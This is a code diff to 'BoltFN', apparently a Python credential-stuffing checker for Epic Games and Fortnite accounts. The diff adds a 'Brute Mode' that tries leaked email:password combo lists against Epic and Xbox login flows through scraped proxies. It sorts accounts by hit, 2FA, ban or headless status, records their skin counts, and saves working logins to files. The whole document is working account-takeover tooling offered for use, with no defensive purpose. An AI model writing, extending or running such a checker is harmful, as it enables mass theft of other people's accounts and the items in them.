@@ -4,12 +4,13 @@ import colorama
 import concurrent.futures
 from yaml import dump, full_load
 from deep_translator import GoogleTranslator
-from bs4 import BeautifulSoup
+from tkinter import filedialog
 from urllib3 import disable_warnings
 import requests
 from colorama import init, Fore
 from random import choice, shuffle
 import cloudscraper
+import win32api
 import time
 import sys
 import time
@@ -36,7 +37,8 @@ default_values = '''checker:
   timeout: 10000
   threads: 100
   save_bad: false
-  debugging: false
+  display_mode: bolt
+  import_from_file: false
   webhook:
     Webhook: false
     WebhookID: https://discordapp.com/api/webhooks/
@@ -85,6 +87,9 @@ class counter:
 
 
 class Counter:
+    brute = False
+    Checking = False
+    remaining = []
     og = 0
     stw = 0
     headless = 0
@@ -105,6 +110,7 @@ class Counter:
     hitspercent = 0
     custompercent = 0
     mshitspercent = 0
+    headlesspercent = 0
     failedpercent = 0
     checkedpercent = 0
     guess = 0
@@ -120,13 +126,12 @@ class Main:
         self.created = str(strftime('-[%m-%d-%Y %H-%M-%S]'))
         self.domain_list = self.lisr()
         disable_warnings()
-        self.version = '1.15'
+        self.version = '1.2'
         self.printing = Queue()
         self.caputer = Queue()
         self.start_time = 0
         self.hits = Queue()
         self.bad = Queue()
-        self.debug = Checker.debug
         self.baddd = []
         self.savebad = Checker.save_bad
         self.proxyapi = Checker.Proxy.proxy_api
@@ -203,16 +208,17 @@ class Main:
         print(f'''
 {Fore.GREEN}|{Fore.WHITE}OPTIONS:
 
-{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Check Accounts {Fore.CYAN}| Normal Mode
-{Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Scrape Proxies {Fore.CYAN}| Scrape proxies for checking
-{Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Edit Combos {Fore.CYAN}| Maximise your combos
-{Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Custom Url Scraper{Fore.CYAN} | Scrape proxies from a url file
-{Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Exit{Fore.CYAN} | Close the checker
+{Fore.WHITE}[{Fore.GREEN}1{Fore.WHITE}] Epicgames with Xbox Login {Fore.CYAN}| Full Capture
+{Fore.WHITE}[{Fore.GREEN}2{Fore.WHITE}] Epicgames with Xbox Login {Fore.CYAN}| Brute Mode
+{Fore.WHITE}[{Fore.GREEN}3{Fore.WHITE}] Scrape Proxies {Fore.CYAN}| Scrape proxies for checking
+{Fore.WHITE}[{Fore.GREEN}4{Fore.WHITE}] Edit Combos {Fore.CYAN}| Maximise your combos
+{Fore.WHITE}[{Fore.GREEN}5{Fore.WHITE}] Custom Url Scraper{Fore.CYAN} | Scrape proxies from a url file
+{Fore.WHITE}[{Fore.GREEN}6{Fore.WHITE}] Exit{Fore.CYAN} | Close the checker
 ''')
         mode = input(f'{Fore.YELLOW} > ')
 
 
-        if mode == "3":
+        if mode == "4":
             system('cls')
             print(self.t)
             windll.kernel32.SetConsoleTitleW(
@@ -272,7 +278,7 @@ class Main:
                         f"{Fore.CYAN}\nPlease enter a valid number\n{Fore.YELLOW}")
                     sleep(1)
                     continue
-        elif mode == "4":
+        elif mode == "5":
             system('cls')
             print(self.t)
             if not path.exists('Scraped.txt'):
@@ -326,7 +332,7 @@ class Main:
             system('cls')
             Main()
 
-        elif mode == "2":
+        elif mode == "3":
             system('cls')
             print(self.t)
             urls = [
@@ -399,9 +405,11 @@ class Main:
             input('Press ENTER to get back to the menu')
             system('cls')
             Main()
-        elif mode == "5":
+        elif mode == "6":
             exit()
-        elif mode == "1":
+        elif mode == "1" or mode == "2":
+            if mode == "2":
+                Counter.brute = True
             system('cls')
             print(self.t)
             print("")
@@ -412,29 +420,37 @@ class Main:
         checkname = input(f'{Fore.LIGHTCYAN_EX}Name for the check: ')
         while True:
             try:
-                lol = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
-                if 'cui' == lol.lower():
+                if Checker.mode.lower() in ('bolt', 'cn', 'nexus'):
                     self.cuimode = 'y'
                     break
-                elif 'log' == lol.lower():
+                elif 'log' == Checker.mode.lower():
                     self.cuimode = 'n'
+                    print_slowly('Using Log Mode', 0.05)
                     break
                 else:
-                    print(f'{Fore.RED}Invalid input')
+                    Checker.mode = input(f'{Fore.LIGHTCYAN_EX}Display mode? cui/log: ')
             except:
                 print(f'{Fore.RED}Invalid input')
         if self.cuimode == 'y':
             while True:
                 try:
-                    lol = input(f'{Fore.LIGHTCYAN_EX}CUI mode? cn/nexus: ')
-                    if lol.lower() == 'cn':
-                        self.cuitype = 'cn'
+                    if Checker.mode.lower() == 'bolt':
+                        self.cuitype = 'bolt'
+                        print(Fore.MAGENTA)
+                        print_slowly('Using BoltFN CUI', 0.05)
                         break
-                    elif lol.lower() == 'nexus':
+                    elif Checker.mode.lower() == 'cn':
+                        self.cuitype = 'cn'
+                        print(Fore.GREEN)
+                        print_slowly('Using CnChecker CUI', 0.05)
+                        break
+                    elif Checker.mode.lower() == 'nexus':
                         self.cuitype = 'nexus'
+                        print(Fore.RED)
+                        print_slowly('Using Nexus CUI', 0.05)
                         break
                     else:
-                        print(f'{Fore.RED}Invalid input')
+                        Checker.mode = input(f'{Fore.LIGHTCYAN_EX}CUI mode? bolt/cn/nexus: ')
                 except:
                     print(f'{Fore.RED}Invalid input')
 
@@ -497,41 +513,75 @@ class Main:
             sleep(1)
             system('cls')
         print(f'{Fore.CYAN}Importing combos.....\n')
+        self.combolist = []
         while True:
-            read_files = glob('combos/*.txt')
-            if read_files == '[]':
-                print(
-                    f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
-                input(f'{Fore.CYAN}Press ENTER when you have done that')
-                continue
-            self.combolist = []
-            for file in read_files:
-                combolistt = open(file, 'r', encoding='u8',
-                                  errors='ignore').read().split('\n')
-                for line in combolistt:
-                    self.combolist.append(f'{line}')
-            break
+            if not Checker.importFromFile:
+                read_files = glob('combos/*.txt')
+                if read_files == '[]':
+                    print(
+                        f'{Fore.YELLOW}No Combos files found in directory please put your combos in there and try again')
+                    input(f'{Fore.CYAN}Press ENTER when you have done that')
+                    continue
+                for file in read_files:
+                    combolistt = open(file, 'r', encoding='u8',
+                                    errors='ignore').read().split('\n')
+                    for line in combolistt:
+                        self.combolist.append(f'{line}')
+                break
+            else:
+                filename = filedialog.askopenfile(mode='rb', title='Choose a Combo file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
+                if filename is None:
+                    print(Fore.LIGHTRED_EX+"Invalid File.")
+                    sleep(1)
+                    continue
+                else:
+                    try:
+                        with open(filename.name, 'r', encoding='u8') as e:
+                            for line in e:
+                                self.combolist.append(f'{line}')
+                            break
+                    except Exception as e:
+                        print(Fore.LIGHTRED_EX+"Unable to read from file")
+                        sleep(1)
+                        continue
         withoutremoved = len(self.combolist)
         self.accounts = set([x for x in self.combolist if x != '' and ':' in x])
         removed = withoutremoved - len(self.accounts)
         print(
         f'{Fore.GREEN}Imported {len(self.accounts)} Combo lines after removing {removed} duplicates\n')
         print(f'{Fore.CYAN}Importing proxies.....\n')
+        self.proxylist = []
         if Checker.Proxy.proxy == True:
             while True:
-                read_files = glob('proxies/*.txt')
-                if read_files == '[]':
-                    print(
-                        f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
-                    input(f'{Fore.CYAN}Press ENTER when you have done that')
-                    continue
-                self.proxylist = []
-                for file in read_files:
-                    proxylistt = open(file, 'r', encoding='u8',
-                                      errors='ignore').read().split('\n')
-                    for line in proxylistt:
-                        self.proxylist.append(f'{line}')
-                break
+                if not Checker.importFromFile:
+                    read_files = glob('proxies/*.txt')
+                    if read_files == '[]':
+                        print(
+                            f'{Fore.YELLOW}No Proxies files found in directory please put your proxies in there and try again')
+                        input(f'{Fore.CYAN}Press ENTER when you have done that')
+                        continue
+                    for file in read_files:
+                        proxylistt = open(file, 'r', encoding='u8',
+                                        errors='ignore').read().split('\n')
+                        for line in proxylistt:
+                            self.proxylist.append(f'{line}')
+                    break
+                else:
+                    filename = filedialog.askopenfile(mode='rb', title='Choose a Proxy file',filetype=(("txt", "*.txt"), ("All files", "*.txt")))
+                    if filename is None:
+                        print(Fore.LIGHTRED_EX+"Invalid File.")
+                        sleep(1)
+                        continue
+                    else:
+                        try:
+                            with open(filename.name, 'r', encoding='u8') as e:
+                                for line in e:
+                                    self.proxylist.append(f'{line}')
+                                break
+                        except:
+                            print(Fore.LIGHTRED_EX+"Unable to read from file")
+                            sleep(1)
+                            continue
         if Checker.Proxy.proxy == True:
             if not self.proxyapi:
                 withoutremoved = len(self.proxylist)
@@ -579,9 +629,12 @@ class Main:
             print('\n')
         if 'y' == self.cuimode:
             Thread(target=self.Refreshconsole, daemon=False).start()
+        Counter.Checking = True
+        Counter.remaining = list(self.accounts)
         with concurrent.futures.ThreadPoolExecutor(max_workers=Checker.threads) as executor:
             futures = [executor.submit(self.usecheck, combo) for combo in self.accounts]
             concurrent.futures.wait(futures)
+        Counter.Checking = False
                     
                             
     def usecheck(self, line):
@@ -735,9 +788,24 @@ class Main:
                                             try:
                                                 response = session.post(url2, headers=headers, data=payload, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if 'id/oauth-authorized?code=' in response.url:
-                                                    break
+                                                    if Counter.brute:
+                                                        if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
+                                                        Counter.hits+=1
+                                                        if 'n' == self.cuimode:
+                                                            if Checker.printms:
+                                                                self.prints(f'{Fore.YELLOW}[HIT] - {line}')
+                                                        if not os.path.exists(self.folder + '/Fortnite'):
+                                                            os.makedirs(self.folder + '/Fortnite')
+                                                        open(f'{self.folder}/Fortnite/Hits.txt', 'a',
+                                                        encoding='u8').write(f'{line}\n')
+                                                        return
+                                                    else:
+                                                        break
                                                 else:
                                                     if retr >= Checker.retries:
+                                                        if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                         Counter.mshit+=1
                                                         if 'n' == self.cuimode:
                                                             if Checker.printms:
@@ -815,6 +883,8 @@ class Main:
                                             try:
                                                 response = scraper.post(url, json=payload, headers=headers, cookies=response.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if 'message":"Two-Factor authentication' in response.text :
+                                                    if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                     Counter.mshit+=1
                                                     Counter.epic2fa+=1
                                                     if 'n' == self.cuimode:
@@ -827,6 +897,8 @@ class Main:
                                                 elif 'errorCode":"errors.com.epicgames.accountportal.account_headless' in response.text:
                                                     Counter.hits+=1
                                                     Counter.headless+=1
+                                                    if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                     if 'n' == self.cuimode:
                                                         self.prints(f'{Fore.GREEN}[HIT][HEADLESS] - {line}')
                                                     if not os.path.exists(self.folder + '/NoCapture'):
@@ -838,6 +910,8 @@ class Main:
                                                 elif 'DATE_OF_BIRTH' in response.text or 'message":"No account was found to log you in' in response.text:
                                                     Counter.mshit+=1
                                                     Counter.xb +=1
+                                                    if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                     if 'n' == self.cuimode:
                                                         if Checker.printms:
                                                             self.prints(f'{Fore.YELLOW}[MS-HIT][XBOX] - {line}')
@@ -914,6 +988,8 @@ class Main:
                                                 response = scraper.get(url, headers=headers, cookies=response2.cookies, proxies=self.proxies(), timeout=Checker.timeout)
                                                 if 'Sorry, your account has too many active logins' in response.text:
                                                         Counter.hits+=1
+                                                        if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
                                                         if not os.path.exists(self.folder + '/NoCapture'):
@@ -924,6 +1000,8 @@ class Main:
                                                 elif '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                     if ret >= Checker.retries:
                                                         Counter.mshit+=1
+                                                        if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                         Counter.epic2fa+=1
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
@@ -1019,6 +1097,8 @@ class Main:
                                                         if 'n' == self.cuimode:
                                                             self.prints(f'{Fore.GREEN}[HIT][NC] - {line}')
                                                         Counter.hits+=1
+                                                        if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                         if not os.path.exists(self.folder + '/NoCapture'):
                                                             os.makedirs(self.folder + '/NoCapture')
                                                         open(f'{self.folder}/NoCapture/logins.txt', 'a',
@@ -1026,6 +1106,8 @@ class Main:
                                                         return
                                                     if '"sid":null,' in response.text or 'Please fill your real email' in response.text:
                                                             Counter.mshit+=1
+                                                            if line in Counter.remaining:
+                                                                Counter.remaining.remove(line)
                                                             Counter.epic2fa
                                                             if 'n' == self.cuimode:
                                                                 self.prints(f'{Fore.GREEN}[HIT][2FA] - {line}')
@@ -1341,6 +1423,8 @@ class Main:
                                                     continue  
                                             if "Login is banned or does not posses the action 'PLAY'" in response_str or "numericErrorCode\" : 1023," in response_str or "messageVars\" : [ \"PLAY" in response_str or response.status_code == 403:
                                                 Counter.mshit +=1
+                                                if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                                 Counter.fnban+=1
                                                 if 'n' == self.cuimode:
                                                     self.prints(f'{Fore.YELLOW}[FN-BAN] - {line}')
@@ -1350,6 +1434,8 @@ class Main:
                                                 encoding='u8').write(f'{line}\n')
                                                 return
                                             Counter.hits+=1
+                                            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                             level_pattern = re.compile(r'"accountLevel"\s*:\s*(\d+)')
                                             total_wins_pattern = re.compile(r'"lifetime_wins"\s*:\s*(\d+)')
                                             level_match = level_pattern.search(response_str)
@@ -1629,6 +1715,8 @@ class Main:
                                     continue
                     else:
                         if result == 'Failure':
+                            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                             Counter.bad+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
@@ -1640,6 +1728,8 @@ class Main:
                                         encoding='u8').write(f'{line}\n')
                             return
                         elif result == '2FACTOR':
+                            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                             Counter.custom+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
@@ -1651,6 +1741,8 @@ class Main:
                                 encoding='u8').write(f'{line}\n')
                             return
                         elif result == 'Ban':
+                            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                             Counter.custom+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
@@ -1662,6 +1754,8 @@ class Main:
                                 encoding='u8').write(f'{line}\n')
                             return
                         elif result == 'CUSTOM':
+                            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                             Counter.locked+=1
                             if Checker.printbadd:
                                 if 'n' == self.cuimode:
@@ -1673,6 +1767,8 @@ class Main:
                                 encoding='u8').write(f'{line}\n')
                             return
                         elif result == 'Unknown':
+                                if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                                 Counter.bad+=1
                                 if Checker.printbadd:
                                     if 'n' == self.cuimode:
@@ -1685,9 +1781,13 @@ class Main:
                                 return
             else:
                 Counter.bad+=1
+                if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
                 return
         except Exception as e:
             Counter.bad+=1
+            if line in Counter.remaining:
+                                                            Counter.remaining.remove(line)
             return
     def follow_redirects(self, scraper, url, headers, cookies, retries, proxies, timeout):
         try:
@@ -1817,7 +1917,6 @@ class Main:
 
     def title(self):
         while True:
-                sleep(1)
                 Total = len(self.accounts)
                 Checked = Counter.hits + Counter.bad + Counter.custom + Counter.mshit + Counter.locked
                 badd = Counter.bad / Total * 100
@@ -1834,17 +1933,31 @@ class Main:
                 Counter.mshitspercent = round((int(Counter.mshit) / Total) * 100, 2)
                 estimatedhits = round(estimated)
                 Total = len(self.accounts)
-                windll.kernel32.SetConsoleTitleW(
-                    f"BoltFN | v{self.version}"
-                    f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
-                    f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
-                    f" | Headless: {Counter.headless} ({Counter.hitspercent}%)"
-                    f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
-                    f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
-                    f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
-                    f' | Retries: {Counter.retries}'
-                    f' | CPM: {Counter.cpm}'
-                    f' | Checking for: {self.Timeused()}')
+                if not Counter.brute:
+                    windll.kernel32.SetConsoleTitleW(
+                        f"BoltFN | v{self.version}"
+                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
+                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
+                        f" | Headless: {Counter.headless} ({Counter.headlesspercent}%)"
+                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
+                        f" | 2FA: {Counter.custom + Counter.locked} ({Counter.custompercent}%)"
+                        f" | Failed: {Counter.bad} ({Counter.failedpercent}%)"
+                        f' | Retries: {Counter.retries}'
+                        f' | CPM: {Counter.cpm}'
+                        f' | Checking for: {self.Timeused()}')
+                else:
+                    inval = Counter.bad + Counter.custom + Counter.locked
+                    badd = inval / Total * 100
+                    Counter.failedpercent = round(badd, 2)
+                    windll.kernel32.SetConsoleTitleW(
+                        f"BoltFN | v{self.version}"
+                        f" | Checked: {int(Counter.bad) + int(Counter.hits) + Counter.custom + Counter.mshit + Counter.locked}/{Total} ({Counter.checkedpercent}%)"
+                        f" | Hits: {Counter.hits} ({Counter.hitspercent}%) [{estimatedhits}]"
+                        f" | MS-Hits: {Counter.mshit} ({Counter.mshitspercent}%)"
+                        f" | Failed: {Counter.bad + Counter.custom + Counter.locked} ({Counter.failedpercent}%)"
+                        f' | Retries: {Counter.retries}'
+                        f' | CPM: {Counter.cpm}'
+                        f' | Checking for: {self.Timeused()}')
 
 
     def proxies(self):
@@ -1975,6 +2088,86 @@ class Main:
 
                         if nfa_count > 0:
                             print(f"{nfa_vertical}    {Fore.WHITE}└── {Fore.WHITE}[{nfa_count}] {Fore.GREEN}NFA")
+                elif self.cuitype == 'bolt':
+                    logo_colored = f'''
+                  {Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}  ██████{Fore.MAGENTA}╗{Fore.BLACK} ██{Fore.MAGENTA}╗{Fore.BLACK}  ████████{Fore.MAGENTA}╗{Fore.BLACK} ██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK} ██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██████{Fore.MAGENTA}╗
+                  {Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}╔═══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  ╚══{Fore.BLACK}██{Fore.MAGENTA}╔══╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}  ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK} ██{Fore.MAGENTA}╔╝{Fore.BLACK}██{Fore.MAGENTA}╔════╝{Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗
+                  {Fore.BLACK}██████{Fore.MAGENTA}╔╝{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}   ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}║    {Fore.BLACK} ██{Fore.MAGENTA}║  {Fore.BLACK} ██{Fore.MAGENTA}║{Fore.BLACK}     ███████{Fore.MAGENTA}║{Fore.BLACK}█████{Fore.MAGENTA}╗{Fore.BLACK}  ██{Fore.MAGENTA}║    {Fore.BLACK} █████{Fore.MAGENTA}╔╝{Fore.BLACK} █████{Fore.MAGENTA}╗  {Fore.BLACK}██████{Fore.MAGENTA}╔╝
+                  {Fore.BLACK}██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK} ██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}║    {Fore.BLACK} ██{Fore.MAGENTA}║   {Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}     ██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}██{Fore.MAGENTA}╔══╝  {Fore.BLACK}██{Fore.MAGENTA}║     {Fore.BLACK}██{Fore.MAGENTA}╔═{Fore.BLACK}██{Fore.MAGENTA}╗{Fore.BLACK} ██{Fore.MAGENTA}╔══╝ {Fore.BLACK} ██{Fore.MAGENTA}╔══{Fore.BLACK}██{Fore.MAGENTA}╗
+                  {Fore.BLACK}██████{Fore.MAGENTA}╔╝╚{Fore.BLACK}██████{Fore.MAGENTA}╔╝{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║   ╚{Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK}██{Fore.MAGENTA}║{Fore.BLACK}███████{Fore.MAGENTA}╗╚{Fore.BLACK}██████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║ {Fore.BLACK} ██{Fore.MAGENTA}╗{Fore.BLACK}███████{Fore.MAGENTA}╗{Fore.BLACK}██{Fore.MAGENTA}║  {Fore.BLACK}██{Fore.MAGENTA}║
+                  {Fore.MAGENTA}╚═════╝  ╚═════╝ ╚══════╝╚═╝    ╚═════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
+
+'''
+                    system('cls')
+                    print(logo_colored)
+                    print(f'                                                  {Fore.MAGENTA}          [{Counter.checkedpercent:.2f}%]\n\n')
+                    zeroskins = 0
+                    oneplus = 0
+                    tenplus = 0
+                    fiftyplus = 0
+                    onehundredplus = 0
+                    twohundredplus = 0
+                    threehundredplus = 0
+                    exclusivee = 0
+                    maybefa = 0
+                    nfa = 0
+                    for data in Counter.skins_data:
+                        fullAccess = data["fullAccess"]
+                        total_skins = data["total_skins"]
+                        exclusive = data['exclusive']
+                        if fullAccess.lower() == 'fa':
+                            maybefa += 1
+                        else:
+                            nfa +=1
+                        if exclusive:
+                            exclusivee+=1
+                        elif 300 <= total_skins:
+                            threehundredplus+=1
+                        elif 200 <= total_skins <= 299:
+                            twohundredplus+=1
+                        elif 100 <= total_skins <= 199:
+                            onehundredplus+=1
+                        elif 50 <= total_skins <= 99:
+                            fiftyplus+=1
+                        elif 10 <= total_skins <= 49:
+                            tenplus+=1
+                        elif 1 <= total_skins <= 9:
+                            oneplus+=1
+                        elif total_skins == 0:
+                            zeroskins +=1
+                    symbo4 = f'{Fore.WHITE}[{Fore.GREEN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbol = f'{Fore.WHITE}[{Fore.CYAN}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo1 = f'{Fore.WHITE}[{Fore.BLUE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo2 = f'{Fore.WHITE}[{Fore.WHITE}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo3 = f'{Fore.WHITE}[{Fore.RED}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symb4o = f'{Fore.WHITE}[{Fore.MAGENTA}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symb5o = f'{Fore.WHITE}[{Fore.YELLOW}»{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo5 = f'{Fore.WHITE}[{Fore.LIGHTGREEN_EX}+{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo6 = f'{Fore.WHITE}[{Fore.LIGHTRED_EX}-{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    symbo7 = f'{Fore.WHITE}[{Fore.LIGHTYELLOW_EX}/{Fore.WHITE}]{Fore.LIGHTWHITE_EX}'
+                    bad = Counter.bad + Counter.mshit + Counter.custom + Counter.locked
+                    if not Counter.brute:
+                        result = (
+                            f'                           {Fore.MAGENTA}  ------CHECKER-------     -------STATS-------      ------SKINS------\n'
+                            f'                              {symbo5} Hits      {Counter.hits:<8}  {symbo4} NFA         {nfa:<8}  {symbo4} 300+     {threehundredplus:<8}\n'
+                            f'                              {symbo6} Fails     {bad:<8}  {symbol} FA          {maybefa:<8}  {symbo4} 200+     {twohundredplus:<8}\n'
+                            f'                              {symbo7} CPM       {Counter.cpm:<8}  {symbo2} STW         {Counter.stw:<8}  {symbo4} 100+     {onehundredplus:<8}\n'
+                            f'                             {Fore.MAGENTA}--------------------     {symbo3} Rares       {exclusivee:<8}  {symbo4} 50+      {fiftyplus:<8}\n'
+                            f'                                                      {symb4o} Ogs         {Counter.og:<8}  {symbo4} 10+      {tenplus:<8}\n'
+                            f'                                                      {symbo1} Headless    {Counter.headless:<8}  {symbo4} 0        {zeroskins:<8}\n'
+                            f'                                                      {symb5o} Epic 2FA    {Counter.epic2fa:<8} {Fore.MAGENTA}-----------------\n'
+                            f'                                                      {Fore.MAGENTA}-------------------'
+                        )
+                    else:
+                        result = (
+                            f'                                       {Fore.MAGENTA}  ------CHECKER-------     -------STATS-------\n'
+                            f'                                          {symbo5} Hits      {Counter.hits:<8}  {symbo4} Locked    {Counter.locked:<8}\n'
+                            f'                                          {symbo6} Fails     {bad:<8}  {symbol} 2FA       {Counter.custom:<8}\n'
+                            f'                                          {symbo7} CPM       {Counter.cpm:<8}  {symbo2} Invalid   {Counter.bad:<8}\n'
+                            f'                                         {Fore.MAGENTA}--------------------     -------------------'
+                        )
+
+                    print(result)
                 elif self.cuitype == 'nexus':
                     logo_colored = [
                                             f"                  {Fore.RED}██████{Fore.LIGHTRED_EX}╗{Fore.RED}  ██████{Fore.LIGHTRED_EX}╗{Fore.RED} ██{Fore.LIGHTRED_EX}╗{Fore.RED}  ████████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED} ██████{Fore.LIGHTRED_EX}╗{Fore.RED}██{Fore.LIGHTRED_EX}╗{Fore.RED}  ██{Fore.LIGHTRED_EX}╗{Fore.RED}███████{Fore.LIGHTRED_EX}╗{Fore.RED}██████{Fore.LIGHTRED_EX}╗",
@@ -2804,9 +2997,16 @@ class Main:
         shuffle(dest)
         return dest
 
-
 class Checker:
-
+    def exit_program(type):
+        if Counter.Checking: 
+            Checker.save_lines()
+    def save_lines():
+        os.system('cls')
+        print(f"    [{Fore.CYAN}Saving Remaining Lines{Fore.RESET}]")
+        unix = str(strftime('[%d-%m-%Y %H-%M-%S]'))
+        with open(f"{unix} Remaining_lines.txt","w", encoding='utf8') as file: file.write("\n".join(Counter.remaining))
+        sleep(1)
     try:
         printbadd = bool(config['checker']['print_fail'])
         printms = bool(config['checker']['print_ms_hit'])
@@ -2814,7 +3014,8 @@ class Checker:
         timeout = int(config['checker']['timeout']) / 1000
         threads = int(config['checker']['threads'])
         save_bad = bool(config['checker']['save_bad'])
-        debug = bool(config['checker']['debugging'])
+        mode = str(config['checker']['display_mode'])
+        importFromFile = bool(config['checker']['import_from_file'])
 
 
         class webhook:
@@ -2838,6 +3039,11 @@ class Checker:
 
 
 if __name__ == '__main__':
+    from sys import platform
+    if platform == "win32":
+        win32api.SetConsoleCtrlHandler(Checker.exit_program, True)
+    else:
+        pass
     agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.104 Safari/537.36'
     from glob import glob
     from re import findall
